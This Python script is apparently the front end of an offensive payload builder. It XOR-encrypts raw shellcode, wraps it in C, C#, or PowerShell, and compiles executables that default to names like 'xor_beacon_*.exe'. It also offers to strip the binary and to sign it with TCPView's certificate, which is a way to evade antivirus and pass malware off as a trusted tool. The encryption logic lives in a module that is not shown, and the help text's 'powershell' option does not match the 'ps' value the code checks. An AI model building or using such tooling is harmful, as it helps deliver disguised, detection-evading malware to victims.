#!/usr/bin/python3
from lib import logger, core
import argparse

parser = argparse.ArgumentParser(description="Build XOR'd shellcode executables.")
parser.add_argument("-l", "--language", metavar="", required=True, help="Language for payload (c, cs and powershell)")
parser.add_argument("-b", "--binary", metavar="", required=True, help="Raw file to encrypt")
parser.add_argument("-k", "--key", metavar="", help="Key to encrypt with (random by default)")
parser.add_argument("-n", "--name", metavar="", help="Name of executable (random by xor_beacon_*.exe)")
parser.add_argument("--x64", default=False, action='store_true', help="Set compiler to x64")
parser.add_argument("--sign", default=False, action='store_true', help="Sign with TCPView's Certificate")
parser.add_argument("--strip", default=False, action='store_true', help="Strip Binary")
args = parser.parse_args()

logger.banner()

lang = args.language

if args.x64:
    arch = 'x64'
else:
    arch = 'x86'

key = args.key
strip = args.strip
sign = args.sign
name = args.name

try:
    file_bytes = open(args.binary, "rb").read()
except Exception as e:
    logger.msg('Error opening file: ',e,'red')
    quit()

scx = core.Scx(lang,arch,key,file_bytes,name)

logger.msg('Architecture: ', scx.arch, 'blue')
logger.msg('Key: ', scx.key, 'blue')

if lang == 'c':
    scx.c()

elif lang == 'cs':
    scx.cs()

elif lang == 'ps':
    scx.ps()

else:
    quit()

if scx.compile():
    if strip:
        scx.strip()
    if sign:
        scx.sign()
